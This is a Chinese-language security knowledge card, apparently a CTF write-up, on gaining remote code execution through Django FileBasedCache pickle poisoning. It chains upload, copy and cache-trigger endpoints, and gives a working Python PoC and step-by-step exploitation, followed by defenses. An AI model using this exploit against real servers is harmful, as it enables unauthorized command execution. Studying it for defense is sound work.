---
id: web-python-deserialization-django-filecache-upload-copy-trigger-pickle-rce
title: Django FileBasedCache 远程投毒链：上传/复制/触发三接口写入 .djcache 触发 Pickle RCE
type: scenario
domain: web
path: web/python/deserialization
technique: django-filecache-upload-copy-trigger-pickle-rce
aliases:
- Django FileBasedCache 上传投毒
- .djcache 远程写入
- cache 文件 pickle RCE
- upload copy cache trigger
- Django 缓存反序列化远程链
- pcb2025 cacheapp
tags:
- python
- django
- pickle
- deserialization
- cache
- file-write
- upload
- rce
- ctf
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V173
  verified_at: '2026-11-06T17:37:02+08:00'
  notes: 已对照原文脚本与图28核对：FileBasedCache格式pickle(expire)+zlib(pickle(value))、md5(':1:key')+.djcache、/upload-/copy-/cache/trigger三接口、命令执行成功均一致；--force差异确认：既有卡依赖SSH本地文件写前置，本卡为远程上传+任意复制+缓存触发，触发条件与环境不同，保留
---

## 一句话结论

当 Django 应用同时暴露“上传文件到 /tmp”“按 src/dst 复制文件”“按 key 读取缓存”三个接口时，攻击者可以构造符合 `FileBasedCache` 格式的恶意 `.djcache`（`pickle(expire)` + `zlib.compress(pickle(value))`），上传后复制到 `md5(':1:'+key)+'.djcache'` 对应的缓存路径，再请求触发接口让 `cache.get(key)` 执行 `pickle.loads`，从而在服务端执行任意命令；无需事先拿到本地文件写权限。

## 原理

- **FileBasedCache 的磁盘格式**：Django 的 `FileBasedCache` 为每个 key 生成一个文件，文件名是 `md5(make_key(key)) + '.djcache'`，`make_key` 默认加版本前缀 `:1:`；文件内容由两部分组成：先 `pickle.dumps(expire_time)`，再 `zlib.compress(pickle.dumps(value))`。读取时 Django 先反序列化过期时间，再解压/反序列化 value。
- **pickle 的 `__reduce__`**：攻击者定义 `class RCE: def __reduce__(self): return (os.system, (command,))`；`pickle.dumps(RCE())` 在 `pickle.loads` 时会调用 `os.system(command)`。把这段 pickle 作为 value 压缩后拼在过期时间后面，就是合法的缓存文件。
- **远程放置文件**：应用提供 `/upload/`（保存到 `/tmp` 并返回路径）与 `/copy/`（`src`、`dst` 任意路径复制）。攻击者先上传恶意缓存文件，再复制到 `CACHE_PATH/md5(':1:'+CACHE_KEY)+'.djcache'`；若 `copy` 未限制源/目标路径，这一步等价于任意文件写。
- **触发**：`/cache/trigger/` 接收 `key`，调用 `cache.get(key)`；缓存命中后 Django 读取该 `.djcache` 并 `pickle.loads`，命令执行。`/cache/viewer/` 可用于确认文件已就位。
- **回显**：`os.system` 不返回输出，攻击者可以让命令重定向到临时文件，再用第二个恶意缓存文件把输出包装成 Django 缓存格式，通过 `cache.get` 读回；或直接把 flag 写到静态目录/外带。
- **为什么成立**：三个接口分别看似无害（上传、复制、读缓存），组合起来把“用户可控文件”放进了“会被 pickle 反序列化的目录”。根因是缓存后端选择 pickle + 缓存目录可写 + 文件操作接口缺少路径约束。

## 触发条件

- Django 使用 `FileBasedCache`（或任何基于 pickle 的文件缓存），缓存目录可由 Web 进程写入。
- 存在用户可控的上传接口，能把文件写到服务器某个路径并返回路径。
- 存在复制/移动/重命名接口，`src`/`dst` 未做白名单或 realpath 限制。
- 存在按 key 读取缓存的接口（或任何会触发 `cache.get` 的业务路由）。
- 攻击者知道或能猜到 `CACHE_KEY` 与 `CACHE_PATH`（常来自 settings/env，题目/源码泄露）。

## 利用步骤

1. **确认缓存后端与配置**：从 settings/源码/报错获取 `CACHE_KEY`、`CACHE_PATH`、版本前缀；确认是 `FileBasedCache`。
2. **计算缓存文件名**：`hashlib.md5(f":1:{key}".encode()).hexdigest() + ".djcache"`。
3. **构造恶意缓存文件**：`pickle.dumps(9999999999)` + `zlib.compress(pickle.dumps(RCE(command)))`，`RCE.__reduce__` 返回 `(os.system, (command,))`。
4. **上传**：POST `/upload/`，拿到 `/tmp/exploit.cache` 路径。
5. **复制到缓存目录**：POST `/copy/`，`src=/tmp/exploit.cache`、`dst=<CACHE_PATH>/<hash>.djcache`。
6. **验证**：POST `/cache/viewer/` 传 `key`，确认文件存在且 hex 预览符合格式。
7. **触发**：POST `/cache/trigger/` 传 `key`，`cache.get` 反序列化执行命令。
8. **取回显**：命令重定向到 `/tmp/out.txt`；再用第二个 RCE 把 out.txt 包装成缓存 value，触发后用 `cache/viewer` 或 `cache/trigger` 读取；或直接写 `/app/static/uploads/flag.txt` 后 HTTP 访问。

## PoC

```python
import os, pickle, zlib, hashlib, requests

class RCE:
    def __init__(self, cmd): self.cmd = cmd
    def __reduce__(self): return (os.system, (self.cmd,))

def make_cache(cmd):
    expire = pickle.dumps(9999999999, pickle.HIGHEST_PROTOCOL)
    payload = zlib.compress(pickle.dumps(RCE(cmd), pickle.HIGHEST_PROTOCOL))
    return expire + payload

base = "http://target:8000"
key = "pwn"
cache_path = "/tmp/django_cache"
fname = hashlib.md5(f":1:{key}".encode()).hexdigest() + ".djcache"

r = requests.post(base + "/upload/", files={"file": ("exploit.cache", make_cache("id > /tmp/out.txt"), "application/octet-stream")})
src = r.json()["filepath"]
requests.post(base + "/copy/", data={"src": src, "dst": f"{cache_path}/{fname}"})
requests.post(base + "/cache/trigger/", data={"key": key})
```

原文命令：`python3 exploit.py http://192.168.18.27:25003/ -c "cat /flag"`；脚本会自动上传、复制、触发，并用第二次 RCE 读取命令输出。

## 变体与关联

- 变体：没有 `/copy/` 时用上传文件名路径穿越/软链接/压缩包解压把文件写进缓存目录；没有 `/cache/trigger/` 时找任意 `cache.get` 业务路由；缓存后端为 Redis/Memcached 时改用对应协议的 pickle 注入（如 gopher）。
- 关联：[[web-python-deserialization-django-file-cache-pickle-rce]]（同类 FileBasedCache pickle，但依赖本地文件写前置）、[[web-python-deserialization-django-redis-session-gopher-pickle-rce]]（Django Redis session gopher 注入）、[[web-python-deserialization-ply-yacc-picklefile-rce]]（pickle 文件反序列化）。
- 同题：`ezDjango` 的三个接口组合；原文用 AI 辅助写 exploit，核心是缓存格式与文件名计算。

## 检测与防御

- **不要用 pickle 缓存不可信目录**：FileBasedCache 目录必须仅 Web 进程可写、不可由上传/复制接口触达；或改用 JSON/签名缓存后端。
- **文件接口约束**：上传/复制/移动接口对 `src`/`dst` 做 realpath 白名单，禁止跨目录复制到缓存/配置/代码目录；上传目录不可执行、不可被缓存读取。
- **缓存完整性**：对缓存文件做 HMAC/签名，读取前校验；禁止从用户可控路径加载缓存。
- **权限**：Web 进程对缓存目录只给必要权限；容器只读根文件系统，缓存目录单独挂载。
- **检测**：监控 `.djcache` 文件的异常创建/覆盖、上传后短时间内的复制到缓存目录、`cache.get` 触发的 `os.system`/`subprocess` 子进程；对 `/copy/` 的 `dst` 含 `..`、绝对路径、缓存目录做告警。
